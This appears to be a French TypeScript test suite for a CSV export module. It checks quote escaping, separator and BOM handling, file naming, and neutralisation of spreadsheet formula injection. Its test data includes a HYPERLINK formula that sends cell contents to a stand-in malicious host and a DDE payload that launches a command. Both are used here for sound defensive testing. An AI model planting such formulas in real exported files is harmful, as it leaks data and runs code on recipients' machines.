// Le fichier exporté, ouvert dans le tableur du commerçant — garde de classe.
//
// Relevé du 14 septembre, sur les six exports CSV du produit. Trois faits :
//
//   1) ÉCHAPPEMENT DU GUILLEMET, sur un titre réel « Menu "midi" — 12,90 € » :
//        leads        : "Menu ""midi"" — 12,90 €"       OK
//        profil       : "Menu """midi""" — 12,90 €"     CASSÉ
//                       relu → « Menu " » + le reste hors du champ
//        statistiques : "Menu ""midi"" — 12,90 €"       OK
//
//   2) SÉPARATEUR : la virgule, sans ligne `sep=`. Excel en français attend le
//      séparateur de liste Windows « ; » — tout atterrit dans la colonne A.
//
//   3) CHAMP LIBRE : le message d'un formulaire est écrit par le PUBLIC. Une
//      cellule commençant par `=` est évaluée comme formule à l'ouverture, dans
//      les trois fabriques.
//
// La classe : un fichier que le produit fabrique pour être ouvert ailleurs se
// relit exactement tel qu'il a été écrit — et rien de ce qu'un inconnu a tapé
// n'y devient une instruction.

import { describe, it, expect } from "vitest"
import fs from "node:fs"
import path from "node:path"
import {
  SEPARATEUR, FIN_DE_LIGNE, BOM, ENTETE_SEPARATEUR, PREFIXE_NEUTRE, TYPE_CSV,
  estFormuleDeTableur, texteNeutralise, celluleCsv, ligneCsv,
  construireCsv, csvDepuisObjets, nomDeFichierCsv,
} from "./exportCsv"

const SRC = path.join(__dirname, "..")
const lire = (p: string) => fs.readFileSync(path.join(SRC, p), "utf8")

/** Relit un CSV comme le ferait un tableur : RFC 4180, séparateur du fichier. */
function relire(csv: string): string[][] {
  let texte = csv.startsWith(BOM) ? csv.slice(1) : csv
  if (texte.startsWith("sep=")) texte = texte.slice(texte.indexOf(FIN_DE_LIGNE) + FIN_DE_LIGNE.length)
  const lignes: string[][] = []
  let champ = "", ligne: string[] = [], dansGuillemets = false
  for (let i = 0; i < texte.length; i++) {
    const c = texte[i]
    if (dansGuillemets) {
      if (c === '"') {
        if (texte[i + 1] === '"') { champ += '"'; i++ } else dansGuillemets = false
      } else champ += c
    } else if (c === '"') dansGuillemets = true
    else if (c === SEPARATEUR) { ligne.push(champ); champ = "" }
    else if (c === "\r" && texte[i + 1] === "\n") { ligne.push(champ); lignes.push(ligne); ligne = []; champ = ""; i++ }
    else champ += c
  }
  if (champ !== "" || ligne.length) { ligne.push(champ); lignes.push(ligne) }
  return lignes
}

describe("ce qu'on écrit est ce qu'on relit", () => {
  const TITRE = 'Menu "midi" — 12,90 €'

  it("le cas du relevé : le guillemet se double, jamais ne se triple", () => {
    expect(celluleCsv(TITRE)).toBe('"Menu ""midi"" — 12,90 €"')
    expect(relire(construireCsv(["Page"], [[TITRE]]))[1]).toEqual([TITRE])
  })

  it("virgule, point-virgule, saut de ligne et guillemet traversent le fichier", () => {
    const durs = ['a,b', `a${SEPARATEUR}b`, 'a"b', "a\nb", "a\r\nb", "  ", "€ ü à"]
    const relu = relire(construireCsv(["V"], durs.map(d => [d])))
    expect(relu.slice(1).map(l => l[0])).toEqual(durs)
  })

  it("une valeur absente devient une cellule vide, pas « null »", () => {
    expect(relire(construireCsv(["A", "B"], [[null, undefined]]))[1]).toEqual(["", ""])
  })

  it("le fichier s'ouvre dans le bon jeu de caractères et le bon séparateur", () => {
    const csv = construireCsv(["Date", "Page"], [["14/09/2026", "Le Comptoir"]])
    expect(csv.startsWith(BOM), "sans BOM, Excel lit « Réservation » en mojibake").toBe(true)
    expect(csv.slice(1).startsWith(ENTETE_SEPARATEUR + FIN_DE_LIGNE)).toBe(true)
    expect(SEPARATEUR, "Excel français attend le séparateur de liste Windows").toBe(";")
    expect(csv).toContain(`"Date"${SEPARATEUR}"Page"`)
    expect(csv.split(FIN_DE_LIGNE).length).toBe(3)
  })
})

describe("rien de ce qu'un inconnu a tapé ne devient une instruction", () => {
  const PIEGE = '=HYPERLINK("https://exemple-malveillant.fr/?f="&A1,"Voir")'

  it("le cas du relevé : le message du formulaire public", () => {
    expect(estFormuleDeTableur(PIEGE)).toBe(true)
    const cellule = relire(construireCsv(["Message"], [[PIEGE]]))[1][0]
    expect(cellule[0], "la cellule serait évaluée à l'ouverture").toBe(PREFIXE_NEUTRE)
    // Le texte reste lisible : on n'a rien perdu, on a seulement désamorcé.
    expect(cellule.slice(1)).toBe(PIEGE)
  })

  it("les quatre débuts que les tableurs exécutent", () => {
    for (const v of ["=1+1", "@SUM(A1)", "+1+1", "-1+1", "\tcmd", "\rX", "=cmd|' /C calc'!A0"]) {
      expect(estFormuleDeTableur(v), JSON.stringify(v)).toBe(true)
    }
  })

  it("mais un numéro de téléphone reste un numéro de téléphone", () => {
    for (const v of ["+33 6 12 34 56 78", "+33612345678", "-12,5", "-4", "06 12 34 56 78", "+33 (0)6-12-34"]) {
      expect(estFormuleDeTableur(v), v).toBe(false)
      expect(texteNeutralise(v), v).toBe(v)
    }
  })

  it("et un texte ordinaire n'est pas décoré", () => {
    for (const v of ["Bonjour", "", "— tiret cadratin", "Réservation samedi", null, undefined]) {
      expect(estFormuleDeTableur(v), String(v)).toBe(false)
    }
    expect(texteNeutralise(null)).toBe("")
  })

  it("l'en-tête aussi passe par la même règle", () => {
    expect(ligneCsv(["=A1", "Nom"])).toBe(`"'=A1"${SEPARATEUR}"Nom"`)
  })
})

describe("le fichier a un nom qu'on retrouve dans son dossier", () => {
  it("daté, sans accent, sans espace", () => {
    const d = new Date("2026-09-14T10:00:00Z")
    expect(nomDeFichierCsv("messages-qrowg", d)).toBe("messages-qrowg-2026-09-14.csv")
    expect(nomDeFichierCsv("Scans — été", d)).toBe("scans-ete-2026-09-14.csv")
    expect(nomDeFichierCsv("", d)).toBe("export-2026-09-14.csv")
    expect(nomDeFichierCsv("!!!", d)).toBe("export-2026-09-14.csv")
  })
})

describe("la fabrique à partir d'objets", () => {
  it("respecte l'ordre des colonnes demandé", () => {
    const csv = csvDepuisObjets([{ a: 1, b: 2 }, { a: 3, b: 4 }], ["b", "a"])
    expect(relire(csv)).toEqual([["b", "a"], ["2", "1"], ["4", "3"]])
  })

  it("sans colonnes, celles de la première ligne ; sans ligne, rien du tout", () => {
    expect(relire(csvDepuisObjets([{ page: "X", vues: 3 }]))[0]).toEqual(["page", "vues"])
    expect(csvDepuisObjets([])).toBe("")
  })
})

describe("les six exports du produit passent par la même fabrique", () => {
  const APPELANTS = [
    "app/dashboard/leads/LeadsClient.tsx",
    "app/dashboard/profile/page.tsx",
    "app/dashboard/analytics/ExportPanel.tsx",
    "app/dashboard/qr-codes/QRStudio.tsx",
  ]

  it("chacun importe le module au lieu de refaire son échappement", () => {
    for (const f of APPELANTS) {
      expect(lire(f), f).toContain('from "@/lib/exportCsv"')
    }
  })

  it("l'échappement en triple du profil a disparu", () => {
    const profil = lire("app/dashboard/profile/page.tsx")
    expect(profil, "le guillemet est encore tripé").not.toContain(`'"\\""'`)
    expect(profil).toContain("csvDepuisObjets(rows, cols)")
  })

  it("plus personne ne recolle son BOM à la main", () => {
    for (const f of APPELANTS) {
      expect(lire(f), `${f} ajoute un second BOM`).not.toContain('"\\uFEFF" +')
    }
  })
})

describe("garde de classe : une seule fabrique de CSV dans tout le produit", () => {
  function fichiers(): string[] {
    const out: string[] = []
    const marcher = (d: string) => {
      for (const n of fs.readdirSync(d).sort()) {
        const p = path.join(d, n)
        if (fs.statSync(p).isDirectory()) { if (n !== "e2e-harness") marcher(p) }
        else if (/\.tsx?$/.test(n) && !/\.test\./.test(n)) out.push(p)
      }
    }
    marcher(SRC)
    return out
  }

  it("tout fichier qui fabrique un CSV passe par lib/exportCsv", () => {
    for (const f of fichiers()) {
      const src = fs.readFileSync(f, "utf8")
      const rel = path.relative(SRC, f)
      if (rel === "lib/exportCsv.ts") continue
      if (!/text\/csv/.test(src) && !/\.csv`/.test(src) && !/\.csv"/.test(src)) continue
      // Un écran qui IMPORTE un .csv n'en fabrique pas : on ne regarde que
      // ceux qui produisent un contenu (Blob, download, type MIME sortant).
      if (!/new Blob\(|download\s*=/.test(src)) continue
      expect(src, `${rel} : fabrique un CSV sans passer par lib/exportCsv`).toContain('from "@/lib/exportCsv"')
    }
  })

  it("et personne ne réécrit l'échappement RFC 4180 dans son coin", () => {
    const motif = /replace\(\/"\/g,\s*'"+\\?"+'\)/
    for (const f of fichiers()) {
      const src = fs.readFileSync(f, "utf8")
      const rel = path.relative(SRC, f)
      if (rel === "lib/exportCsv.ts") continue
      for (const ligne of src.split("\n")) {
        if (!motif.test(ligne)) continue
        expect.fail(`${rel} : échappement CSV écrit à la main — ${ligne.trim()}`)
      }
    }
  })

  it("le type MIME est écrit une fois, pas six", () => {
    expect(TYPE_CSV).toContain("charset=utf-8")
    for (const f of fichiers()) {
      const src = fs.readFileSync(f, "utf8")
      const rel = path.relative(SRC, f)
      if (rel === "lib/exportCsv.ts") continue
      for (const ligne of src.split("\n")) {
        if (!/type:\s*"text\/csv/.test(ligne)) continue
        expect.fail(`${rel} : type MIME CSV écrit en dur — ${ligne.trim()}`)
      }
    }
  })
})
